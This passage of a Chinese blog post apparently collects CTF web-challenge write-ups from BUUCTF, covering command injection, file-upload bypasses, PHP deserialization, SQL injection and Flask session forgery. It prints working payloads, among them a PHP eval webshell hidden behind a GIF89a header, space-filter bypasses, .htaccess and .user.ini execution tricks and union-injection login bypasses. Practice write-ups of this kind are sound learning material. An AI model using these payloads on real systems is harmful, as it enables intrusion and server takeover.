IP。</strong></p><p><strong>Referer：表示这是请求是从哪个URL进来的</strong></p><p>Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机</p><p><strong>User-Agent：发送请求的浏览器类型、操作系统等信息</strong></p><p>Accept：客户端可识别的内容类型列表，用于指定客户端接收那些类型的信息</p><p>Accept-Encoding：客户端可识别的数据编码</p><p>Accept-Language：表示浏览器所支持的语言类型</p><p>Connection：允许客户端和服务器指定与请求/响应连接有关的选项，例如这是为Keep-Alive则表示保持连接。</p><p>Transfer-Encoding：告知接收端为了保证报文的可靠传输，对报文采用了什么编码方式。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>进入后先根据题目试一下?ip=127.0.0.1</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145218124.png" alt="image-20210418145218124"></p><p>再用ls查看发现存在flag.php和index.php两个文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145306532.png" alt="image-20210418145306532"></p><p>尝试直接查看flag.php发现空格被过滤</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145349850.png" alt="image-20210418145349850"></p><p>绕过空格方式</p><pre class="language-none"><code class="language-none">$&#123;IFS&#125;替换$IFS$1替换$&#123;IFS替换%20替换&lt;和&lt;&gt;重定向符替换%09替换</code></pre><p>$IFS是bash中的内部域分隔符，可以代替空格至于后面的$9数字是可以随意的</p><p>发现利用$IFS$1可以绕过，但flag也被过滤了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145543298.png" alt="image-20210418145543298"></p><p>于是先查看index.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145608672.png" alt="image-20210418145608672"></p><p>百度之后找到一种利用内联的payload</p><p>?ip=127.0.0.1;cat$IFS$1 <code>ls</code></p><p>将反引号内命令的输出作为输入执行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418150550054.png" alt="image-20210418150550054"></p><p><a href="https://blog.csdn.net/qq_46184013/article/details/107061110">GXYCTF2019]Ping Ping Ping 做题总结_孙得劲的博客-CSDN博客</a></p><p>[<a href="https://blog.csdn.net/qq_42812036/article/details/104297163">GXYCTF2019]Ping Ping Ping {命令执行总结}_昂首下楼梯的博客-CSDN博客</a></p><p>一些其他的绕过方式</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>进入后是个计算器，查看源码后发现</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173536708.png" alt="image-20210424173536708"></p><p>查看calc.php看到php代码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173603735.png" alt="image-20210424173603735"></p><p>看到过滤掉了很多字符</p><p>尝试传入参数发现仅能传入数字</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174247126.png" alt="image-20210424174247126"></p><p>百度后得知这里设置了waf</p><p>可以利用php在解析字符串时会删除空白符并将某些字符转换为下划线的特性绕过</p><p>所以尝试在num前加空格</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174652548.png" alt="image-20210424174652548"></p><p>绕过成功</p><p>接下来尝试构造命令得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175021538.png" alt="image-20210424175021538"></p><p>利用scandir函数可读取目录</p><p>由于/被过滤</p><p>所以利用chr函数绕过</p><p>构造</p><p>[node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)))](<a href="http://node3.buuoj.cn:26183/calc.php">http://node3.buuoj.cn:26183/calc.php</a>? num=print_r(scandir(chr(47))</p><p>得到</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175958985.png" alt="image-20210424175958985"></p><p>看到有个f1agg</p><p>利用readfile或者file_get_contents查看这个文件</p><p>? num=print_r(file_get_contents(chr(47).f1agg))</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424180753601.png" alt="image-20210424180753601"></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>先做个一句话木马，上传后显示</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424222521044.png" alt="image-20210424222521044"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184048567.png" alt="image-20210424184048567"></p><p>用bp抓包然后修改Content-Type为image/jpeg</p><p>  Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191606823.png" alt="image-20210424191606823"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184352223.png" alt="image-20210424184352223"></p><p>放包后又显示不能为php</p><p>百度得知绕过后缀的有文件格式有php,</p><p>,php4,php5,phtml.pht</p><p>试一试</p><p>发现可用phtml绕过</p><p>但又提示</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184937815.png" alt="image-20210424184937815"></p><p>把文件内容改为</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191120947.png" alt="image-20210424191120947"></p><p>又提示</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191418367.png" alt="image-20210424191418367"></p><p>在一句话木马前加个文件头GIF89a(GIF89a图片头文件欺骗)</p><p>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;<br>Content-Type: image/jpeg</p><p>GIF89a<script language="php"> @eval($_POST["a"]);</script></p><p>上传成功</p><p>猜测上传地址为/upload/</p><p>菜刀连接</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190843452.png" alt="image-20210424190843452"></p><p>在根目录下找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190943560.png" alt="image-20210424190943560"></p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>文件上传，先传个一句话木马试试</p><p>弹出js，</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215707910.png" alt="image-20210424215707910"></p><p>看一下源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215933835.png" alt="image-20210424215933835"></p><p>把这个事件remove掉</p><p>上传后又提示</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215102729.png" alt="image-20210424215102729"></p><p>试试改改后缀名，发现phtml可以成功上传</p><p>菜刀连接</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221314425.png" alt="image-20210424221314425"></p><p>在虚拟终端中利用cat命令找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221437332.png" alt="image-20210424221437332"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>根据题目得知有.bak的备份文件，访问一下index.php.bak得到备份文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424230600364.png" alt="image-20210424230600364"></p><p>代码审计可知要传入key的值与str的值相等，且key只能为数字类型</p><p>因为==是弱类型比较，根据php的性质可传入?key=123</p><p>得到flag</p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>到payflag的页面发现有两个条件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424234920389.png" alt="image-20210424234920389"></p><p>查看源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235003731.png" alt="image-20210424235003731"></p><p>抓个包</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235104576.png" alt="image-20210424235104576"></p><p>将user改为1可满足第一个条件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235148397.png" alt="image-20210424235148397"></p><p>之后要以post方式传入一个值令其等于404且不能为纯数字</p><p>所以post password=404a</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235248917.png" alt="image-20210424235248917"></p><p>提示要pay for the flag</p><p>猜测要post进money=100000000</p><p>传入后提示数字过长</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235409212.png" alt="image-20210424235409212"></p><p>采用科学计数法，得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235455547.png" alt="image-20210424235455547"></p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>进入后看起来像是上传一句话木马的题</p><p>先传一个正常的</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165659496.png" alt="image-20210501165659496"></p><p>提示illegal suffix!非法后缀</p><p>改个后缀名试试</p><p>改成.jpg文件后成功绕过，但又提示&lt;? in contents!</p><p>猜测&lt;?被过滤了</p><p>修改后</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165911275.png" alt="image-20210501165911275"></p><p>最后再加个GIF89a文件头，绕过最后一个exif_imagetype函数的检测</p><p>虽然成功上传了但菜刀无法连接</p><p>百度一下wp</p><p><strong>.user.ini</strong></p><p>　1、auto_prepend_file 在页面顶部加载文件<br>　2、auto_append_file 在页面底部加载文件</p><p>某网站限制不允许上传.php文件，可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。在含有.user.ini的文件夹下要有正常的php文件</p><p>再上传一个.user.ini</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501170533467.png" alt="image-20210501170533467"></p><p>上传后我们访问此目录下的任何一个文件时，都会去包含first.jpg,</p><p>根据其返回的地址用菜刀连接</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174943263.png" alt="image-20210501174943263"></p><p>找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174705927.png" alt="image-20210501174705927"></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501204543745.png" alt="image-20210501204543745"></p><p>看见file_get_contents(),利用伪协议data://text/plain;base64绕过</p><p>再利用php://filter读取useless内的内容</p><p>解码后</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501183046395.png" alt="image-20210501183046395"></p><p>可知flag在flag.php中</p><p>试图让file=flag.php</p><p>看到unserialize函数，利用php反序列化</p><p>构造payload</p><p>？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205224647.png" alt="image-20210501205224647"></p><p>查看源码找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205239104.png" alt="image-20210501205239104"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>页面中提示有备份文件，御剑扫一遍</p><p>找到存在<a href="http://www.zip/">www.zip</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220739803.png" alt="image-20210501220739803"></p><p>重点在class.php和index.php中</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220822144.png" alt="image-20210501220309908"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220857753.png" alt="image-20210501220857753"></p><p>所以要传入一个select参数，利用反序列化让username=admin</p><p>password=100</p><p>因为username和password两个为private类型</p><p>所以有隐藏的空格符</p><p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220212731.png" alt="image-20210501220212731"></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先传个.htaccess文件，为了解析图片码</p><pre class="language-none"><code class="language-none">htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</code></pre><pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php &#x2F;&#x2F;该语句作用是让Apache将其他类型文件均以php格式解析</code></pre><p>再传个一句话木马，然后bp抓包</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502142204069.png" alt="image-20210502142204069"></p><p>只有将其改为图片的类型才能成功上传</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141437234.png" alt="image-20210502141437234"></p><p>根据返回的路径用菜刀连接</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141422576.png" alt="image-20210502141422576"></p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>进入后代码审计</p><p>先get进两个md5值相等的内容</p><p>md5无法处理数组，会返回NULL，使其相等</p><p>再根据php的特性post进passwd=1234567a绕过if</p><p>获得flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502172416595.png" alt="image-20210502172416595"></p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>从提示可以看出来这个tornado是一个python的模板，在web使用的时候给出了四个文件，可以访问，从提示中和url中可以看出，访问需要文件名+文件签名（长度为32位，计算方式为md5(cookie_secret + md5(filename))）;  flag文件名题目已给出 /fllllllllllag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723131705440.png" alt="image-20210723131705440"></p><p>所以要做的就是要获得到cookie值</p><p>这里是采用模板注入的方式 </p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723132903953.png" alt="image-20210723132903953"></p><p>这里可以猜出来存在模板注入漏洞而且应该存在过滤</p><p>然后百度看一下wp</p><pre class="language-none"><code class="language-none">在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，具体定义可以[参考Tornado官方文档](http:&#x2F;&#x2F;tornado.readthedocs.org&#x2F;en&#x2F;latest&#x2F;guide&#x2F;templates.html#template-syntax)！</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135655762.png" alt="image-20210723135655762"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723134312675.png" alt="image-20210723134312675"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135914756.png" alt="image-20210723135914756"></p><p>所以可以利用这个来读取cookie_secret</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723140608282.png" alt="image-20210723140608282"></p><p>然后对其进行md5加密就能得到flag了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135951327.png" alt="image-20210723135951327"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">HCTF2018-admin_迷风小白-CSDN博客</a></p><p>注册个账户登录后可以在修改密码页面的源码注释中找到提示</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723145616780.png" alt=" "></p><p>查看可以找到题目源码</p><p><strong>一、 session伪造</strong></p><p>flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164939605.png" alt="image-20210723164939605"></p><p>找到session后利用py脚本进行解码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163354906.png" alt="image-20210723163354906"></p><p>依照题意可以猜测只有用admin账户登录才能得到flag，所以要伪造session来使我们被认为是admin账户</p><p>重新编码session时需要用到secret_key可以在config.py中找到</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163710686.png" alt="image-20210723163710686"></p><p>伪造session</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163828745.png" alt="image-20210723163828745"></p><p>修改后刷新页面得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164748497.png" alt="image-20210723164748497"></p><p><strong>二：Unicode欺骗</strong></p><p>代码审计可以看出在登录注册和修改密码时都存在用户名的小写转换</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723165801699.png" alt="image-20210723165801699"></p><p>看一下strlower</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723170037720.png" alt="image-20210723170037720"></p><p><code>Twisted</code>版本为<code>10.2.0</code>，而目前(2020/10/28)<code>Twisted</code>最新版本已有<code>20.3.0</code>，这里使用的版本非常旧<br><code>10.2.0</code>版的<code>nodeprep.prepare()</code>对一些特殊的<code>Unicode</code>编码处理后会得到一个正常的字符。可以知道当使用了nodeprep.prepare()函数之后，如果我们先使用unicode的编码的字符，比如说 ᴬ ，使用该函数之后，他会先变成大写的A，再使用一次就会变成小写的a。</p><p>所以可以注册一个ᴬᴰᴹᴵᴺ用户再通过登录和修改密码两次令其变为admin</p><p><a href="https://unicode-table.com/en/">Basic Latin — ✔️ ❤️ ★ Unicode Character Table (unicode-table.com)</a>可以从这个网站查字符</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172720848.png" alt="image-20210723172720848"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172812674.png" alt="image-20210723172812674"></p><p>这里登录之后进行修改密码，则通过小写转换就会变为修改admin账户的密码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723181917454.png" alt="image-20210723181917454"></p><p><strong>三、弱密码</strong></p><p>用户admin密码为123</p><p>爆破或者试一试就能试出来密码</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>进入后只有一个提交框，没啥思路，先用bp抓个包</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205715453.png" alt="image-20210723205715453"></p><p>看见有个hint</p><p>select * from &#39;admin&#39; where password=md5($pass,true)</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205633361.png" alt="image-20210723205633361"></p><p>然后猜这里应该要利用sql注入的，但我不会了x</p><p>看了一下说是要用ffifdyop来绕过，因为这个字符串经过md5之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是&#39; or &#39;6</p><p>就会构成万能密码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210730068.png" alt="image-20210723210730068"></p><p>成功进入下一步，先查看源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210837745.png" alt="image-20210723210837745"></p><p>利用md5不能处理数组会返回null的特性就能绕过，接下来进行代码审计</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210915141.png" alt="image-20210723210915141"></p><p>同样可以利用md5不能处理数组的特性</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723211130123.png" alt="image-20210723211130123"></p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>sql注入，先用fuzz测一下过滤（buu的网站好像有post限制，所以post到后面之后会显示提交次数过多，而且不知道是不是bp的问题有些没有过滤的也会被显示为被过滤了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724095707401.png" alt="image-20210724095707401"></p><p>这里应该要采用bool盲注的方式，但是过滤的东西有点多</p><p>因为空格被过滤了所以要利用（）来代替空格</p><p>抄了个脚本</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724131620633.png" alt="image-20210724131620633"></p><p>感觉是很简单的盲注，然后要利用python编脚本</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p> <a href="https://blog.csdn.net/qq_45521281/article/details/107167452">GXYCTF2019]BabySQli——“绕过md5比较”_WHOAMIAnony的博客-CSDN博客</a></p><p>当用户名为admin时，提示密码错误，因此能知道用户名为admin</p><p>登录后跳转到search.php中，在源码里存在一个进行base加密的提示</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724153525231.png" alt="image-20210724153525231"></p><p>sql注入，先fuzz看一下过滤</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724152502898.png" alt="image-20210724152502898"></p><p>然后可以利用大写绕过查到共有3列（其实直接union试也可以</p><p>之后要利用联合注入</p><p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724152803276.png" alt="image-20210724152803276"></p><p>后端代码</p><pre class="language-none"><code class="language-none">&lt;?php$row;$pass&#x3D;$_POST[&#39;pw&#39;];if($row[&#39;username&#39;]&#x3D;&#x3D;’admin’)&#123;if($row[&#39;password&#39;]&#x3D;&#x3D;md5($pass))&#123; echo $flag; &#125;else&#123; echo “wrong pass!”; &#125;&#125;else&#123; echo “wrong user!”;&#125;</code></pre><p>所以可以在联合查询时构造虚拟的数据利用这个数据进行登录操作</p><pre class="language-none"><code class="language-none">username&#x3D;0&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; #password&#x3D;123</code></pre><p>得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724153406008.png" alt="image-20210724153406008"></p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>先join一下，然后源码里有</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724215234506.png" alt="image-20210724215234506"></p><p>这里过滤了union select 中间可以加个注释符来当空格来绕过去</p><p>这个页面存在注入点，最终可以查到这些</p><p><img 